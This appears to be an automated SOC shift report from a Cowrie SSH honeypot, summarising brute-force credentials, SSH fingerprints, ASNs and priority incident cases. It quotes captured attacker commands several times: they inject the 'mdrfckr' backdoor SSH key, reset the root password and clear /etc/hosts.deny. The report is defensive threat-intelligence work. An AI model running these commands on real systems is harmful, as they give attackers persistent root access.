# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-26 |
| **Generated At** | 2026-04-26T20:44:12Z |
| **Shift Time** | 20:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **138** |
| Confirmed Threats | **88** |
| False Positives Filtered | **50** (36.2%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **10** |
| High Severity Cases | **40** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **98** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **64** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **7** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `345gs5662d34` | 19 |
| `deployroot` | 1 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: curl/7.64.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 18 |
| `naruto` | 1 |
| `------fuck------` | 1 |
| `frenchfries2026` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 18 |
| `root` | `naruto` | 1 |
| `root` | `------fuck------` | 1 |
| `root` | `frenchfries2026` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `naruto` | `14.63.196.175` | 2026-04-26T19:01:02 |
| `root` | `3245gs5662d34` | `14.63.196.175` | 2026-04-26T19:01:06 |
| `root` | `------fuck------` | `112.4.186.109` | 2026-04-26T19:12:16 |
| `root` | `frenchfries2026` | `106.12.69.68` | 2026-04-26T19:16:21 |
| `root` | `server4you` | `170.238.160.191` | 2026-04-26T19:35:51 |
| `root` | `3245gs5662d34` | `170.238.160.191` | 2026-04-26T19:35:58 |
| `root` | `!QAZ@WSX#EDC4rfv` | `170.238.160.191` | 2026-04-26T19:37:40 |
| `root` | `davox` | `170.238.160.191` | 2026-04-26T19:38:35 |
| `root` | `Ab12` | `170.238.160.191` | 2026-04-26T19:39:26 |
| `root` | `!Q2w3e4r` | `170.238.160.191` | 2026-04-26T19:40:24 |
| `root` | `nuha` | `170.238.160.191` | 2026-04-26T19:41:14 |
| `root` | `qwert123` | `170.238.160.191` | 2026-04-26T19:42:07 |
| `root` | `qwewq` | `170.238.160.191` | 2026-04-26T19:42:58 |
| `root` | `Asdf!@$` | `170.238.160.191` | 2026-04-26T19:43:49 |
| `root` | `ubuntu` | `182.66.193.212` | 2026-04-26T19:44:30 |
| `root` | `rzx@1218` | `170.238.160.191` | 2026-04-26T19:44:42 |
| `root` | `Xjcc@2025` | `170.238.160.191` | 2026-04-26T19:45:34 |
| `root` | `zlyy@2025` | `170.238.160.191` | 2026-04-26T19:46:26 |
| `root` | `localhost1234` | `170.238.160.191` | 2026-04-26T19:47:16 |
| `root` | `\]=[-p` | `170.238.160.191` | 2026-04-26T19:48:08 |
| `root` | `040191flo` | `170.238.160.191` | 2026-04-26T19:49:00 |
| `root` | `root!2026` | `170.238.160.191` | 2026-04-26T19:49:53 |
| `root` | `[michael]` | `170.238.160.191` | 2026-04-26T19:50:49 |
| `root` | `---fuck_you----` | `118.196.117.234` | 2026-04-26T20:06:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **138** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 71 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 54 | 1 |
| `03a80b21afa8...` | Modern SSH client | 13 | 2 |
| `98f63c4d9c87...` | Generic scanner | 2 | 2 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 54 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 13 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:mz7dSXScWsg5"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.12.69.68`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `170.238.160.191`, `14.63.196.175`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **14** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS266327` | NCS-Fibra ( New Central Solutions ) | 1 | HIGH |
| `AS701` | Verizon Business | 1 | LOW |
| `AS56046` | China Mobile communications corporation | 1 | HIGH |
| `AS49332` | Lanet Network Ltd | 1 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS263099` | STIW Sistema de Telecom. Inf e Wireless LTDA | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (40)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4d56d2aa5bfc

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-04-26 19:01 |
| **Last Seen** | 2026-04-26 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:01:01` | `cowrie.session.connect` |
| `2026-04-26 19:01:01` | `cowrie.client.version` |
| `2026-04-26 19:01:01` | `cowrie.client.kex` |
| `2026-04-26 19:01:02` | `cowrie.login.success` |
| `2026-04-26 19:01:02` | `cowrie.session.params` |
| `2026-04-26 19:01:02` | `cowrie.command.input` |
| `2026-04-26 19:01:02` | `cowrie.command.failed` |
| `2026-04-26 19:01:03` | `cowrie.log.closed` |
| `2026-04-26 19:01:03` | `cowrie.session.params` |
| `2026-04-26 19:01:03` | `cowrie.command.input` |
| `2026-04-26 19:01:03` | `cowrie.session.file_download` |
| `2026-04-26 19:01:03` | `cowrie.log.closed` |
| `2026-04-26 19:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4a1fc618ef1

| Field | Detail |
|---|---|
| **Source IP** | `14.63.196[.]175` |
| **First Seen** | 2026-04-26 19:01 |
| **Last Seen** | 2026-04-26 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:01:05` | `cowrie.session.connect` |
| `2026-04-26 19:01:05` | `cowrie.client.version` |
| `2026-04-26 19:01:05` | `cowrie.client.kex` |
| `2026-04-26 19:01:06` | `cowrie.login.success` |
| `2026-04-26 19:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.196[.]175` to AbuseIPDB if not already reported
- [ ] Block `14.63.196[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3813f12877e

| Field | Detail |
|---|---|
| **Source IP** | `112.4.186[.]109` |
| **First Seen** | 2026-04-26 19:12 |
| **Last Seen** | 2026-04-26 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:12:15` | `cowrie.session.connect` |
| `2026-04-26 19:12:15` | `cowrie.client.version` |
| `2026-04-26 19:12:15` | `cowrie.client.kex` |
| `2026-04-26 19:12:16` | `cowrie.login.success` |
| `2026-04-26 19:12:16` | `cowrie.session.params` |
| `2026-04-26 19:12:16` | `cowrie.command.input` |
| `2026-04-26 19:12:16` | `cowrie.log.closed` |
| `2026-04-26 19:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.4.186[.]109` to AbuseIPDB if not already reported
- [ ] Block `112.4.186[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dccfcd88791a

| Field | Detail |
|---|---|
| **Source IP** | `106.12.69[.]68` |
| **First Seen** | 2026-04-26 19:16 |
| **Last Seen** | 2026-04-26 19:16 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mz7dSXScWsg5"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:16:14` | `cowrie.session.connect` |
| `2026-04-26 19:16:14` | `cowrie.client.version` |
| `2026-04-26 19:16:15` | `cowrie.client.kex` |
| `2026-04-26 19:16:21` | `cowrie.login.success` |
| `2026-04-26 19:16:22` | `cowrie.session.params` |
| `2026-04-26 19:16:22` | `cowrie.command.input` |
| `2026-04-26 19:16:22` | `cowrie.command.failed` |
| `2026-04-26 19:16:23` | `cowrie.log.closed` |
| `2026-04-26 19:16:37` | `cowrie.session.params` |
| `2026-04-26 19:16:37` | `cowrie.command.input` |
| `2026-04-26 19:16:37` | `cowrie.session.file_download` |
| `2026-04-26 19:16:37` | `cowrie.log.closed` |
| `2026-04-26 19:16:43` | `cowrie.session.params` |
| `2026-04-26 19:16:43` | `cowrie.command.input` |
| `2026-04-26 19:16:43` | `cowrie.log.closed` |
| `2026-04-26 19:16:43` | `cowrie.session.params` |
| `2026-04-26 19:16:43` | `cowrie.command.input` |
| `2026-04-26 19:16:44` | `cowrie.log.closed` |
| `2026-04-26 19:16:44` | `cowrie.session.params` |
| `2026-04-26 19:16:44` | `cowrie.command.input` |
| `2026-04-26 19:16:44` | `cowrie.session.file_download` |
| `2026-04-26 19:16:44` | `cowrie.log.closed` |
| `2026-04-26 19:16:45` | `cowrie.session.params` |
| `2026-04-26 19:16:45` | `cowrie.command.input` |
| `2026-04-26 19:16:45` | `cowrie.log.closed` |
| `2026-04-26 19:16:45` | `cowrie.session.params` |
| `2026-04-26 19:16:45` | `cowrie.command.input` |
| `2026-04-26 19:16:46` | `cowrie.log.closed` |
| `2026-04-26 19:16:47` | `cowrie.session.params` |
| `2026-04-26 19:16:47` | `cowrie.command.input` |
| `2026-04-26 19:16:47` | `cowrie.command.input` |
| `2026-04-26 19:16:47` | `cowrie.log.closed` |
| `2026-04-26 19:16:47` | `cowrie.session.params` |
| `2026-04-26 19:16:47` | `cowrie.command.input` |
| `2026-04-26 19:16:48` | `cowrie.log.closed` |
| `2026-04-26 19:16:48` | `cowrie.session.params` |
| `2026-04-26 19:16:48` | `cowrie.command.input` |
| `2026-04-26 19:16:48` | `cowrie.log.closed` |
| `2026-04-26 19:16:49` | `cowrie.session.params` |
| `2026-04-26 19:16:49` | `cowrie.command.input` |
| `2026-04-26 19:16:49` | `cowrie.log.closed` |
| `2026-04-26 19:16:50` | `cowrie.session.params` |
| `2026-04-26 19:16:50` | `cowrie.command.input` |
| `2026-04-26 19:16:50` | `cowrie.log.closed` |
| `2026-04-26 19:16:50` | `cowrie.session.params` |
| `2026-04-26 19:16:50` | `cowrie.command.input` |
| `2026-04-26 19:16:51` | `cowrie.log.closed` |
| `2026-04-26 19:16:52` | `cowrie.session.params` |
| `2026-04-26 19:16:52` | `cowrie.command.input` |
| `2026-04-26 19:16:52` | `cowrie.log.closed` |
| `2026-04-26 19:16:53` | `cowrie.session.params` |
| `2026-04-26 19:16:53` | `cowrie.command.input` |
| `2026-04-26 19:16:53` | `cowrie.log.closed` |
| `2026-04-26 19:16:53` | `cowrie.session.params` |
| `2026-04-26 19:16:53` | `cowrie.command.input` |
| `2026-04-26 19:16:53` | `cowrie.log.closed` |
| `2026-04-26 19:16:54` | `cowrie.session.params` |
| `2026-04-26 19:16:54` | `cowrie.command.input` |
| `2026-04-26 19:16:54` | `cowrie.log.closed` |
| `2026-04-26 19:16:55` | `cowrie.session.params` |
| `2026-04-26 19:16:55` | `cowrie.command.input` |
| `2026-04-26 19:16:55` | `cowrie.log.closed` |
| `2026-04-26 19:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.69[.]68` to AbuseIPDB if not already reported
- [ ] Block `106.12.69[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15695dee6a88

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:35 |
| **Last Seen** | 2026-04-26 19:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:35:50` | `cowrie.session.connect` |
| `2026-04-26 19:35:50` | `cowrie.client.version` |
| `2026-04-26 19:35:50` | `cowrie.client.kex` |
| `2026-04-26 19:35:51` | `cowrie.login.success` |
| `2026-04-26 19:35:52` | `cowrie.session.params` |
| `2026-04-26 19:35:52` | `cowrie.command.input` |
| `2026-04-26 19:35:52` | `cowrie.command.failed` |
| `2026-04-26 19:35:52` | `cowrie.log.closed` |
| `2026-04-26 19:35:53` | `cowrie.session.params` |
| `2026-04-26 19:35:53` | `cowrie.command.input` |
| `2026-04-26 19:35:53` | `cowrie.session.file_download` |
| `2026-04-26 19:35:53` | `cowrie.log.closed` |
| `2026-04-26 19:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32fca8845e3

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:35 |
| **Last Seen** | 2026-04-26 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:35:57` | `cowrie.session.connect` |
| `2026-04-26 19:35:57` | `cowrie.client.version` |
| `2026-04-26 19:35:57` | `cowrie.client.kex` |
| `2026-04-26 19:35:58` | `cowrie.login.success` |
| `2026-04-26 19:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9652117cf246

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:37 |
| **Last Seen** | 2026-04-26 19:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:37:38` | `cowrie.session.connect` |
| `2026-04-26 19:37:38` | `cowrie.client.version` |
| `2026-04-26 19:37:39` | `cowrie.client.kex` |
| `2026-04-26 19:37:40` | `cowrie.login.success` |
| `2026-04-26 19:37:41` | `cowrie.session.params` |
| `2026-04-26 19:37:41` | `cowrie.command.input` |
| `2026-04-26 19:37:41` | `cowrie.command.failed` |
| `2026-04-26 19:37:41` | `cowrie.log.closed` |
| `2026-04-26 19:37:42` | `cowrie.session.params` |
| `2026-04-26 19:37:42` | `cowrie.command.input` |
| `2026-04-26 19:37:42` | `cowrie.session.file_download` |
| `2026-04-26 19:37:42` | `cowrie.log.closed` |
| `2026-04-26 19:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124c7ddeced9

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:37 |
| **Last Seen** | 2026-04-26 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:37:45` | `cowrie.session.connect` |
| `2026-04-26 19:37:45` | `cowrie.client.version` |
| `2026-04-26 19:37:46` | `cowrie.client.kex` |
| `2026-04-26 19:37:47` | `cowrie.login.success` |
| `2026-04-26 19:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-079aecb371c8

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:38 |
| **Last Seen** | 2026-04-26 19:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:38:33` | `cowrie.session.connect` |
| `2026-04-26 19:38:33` | `cowrie.client.version` |
| `2026-04-26 19:38:33` | `cowrie.client.kex` |
| `2026-04-26 19:38:35` | `cowrie.login.success` |
| `2026-04-26 19:38:35` | `cowrie.session.params` |
| `2026-04-26 19:38:35` | `cowrie.command.input` |
| `2026-04-26 19:38:35` | `cowrie.command.failed` |
| `2026-04-26 19:38:36` | `cowrie.log.closed` |
| `2026-04-26 19:38:36` | `cowrie.session.params` |
| `2026-04-26 19:38:36` | `cowrie.command.input` |
| `2026-04-26 19:38:37` | `cowrie.session.file_download` |
| `2026-04-26 19:38:37` | `cowrie.log.closed` |
| `2026-04-26 19:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee486060f18

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-04-26 19:38 |
| **Last Seen** | 2026-04-26 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-26 19:38:40` | `cowrie.session.connect` |
| `2026-04-26 19:38:40` | `cowrie.client.version` |
| `2026-04-26 19:38:41` | `cowrie.client.kex` |
| `2026-04-26 19:38:42` | `cowrie.login.success` |
| `2026-04-26 19:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

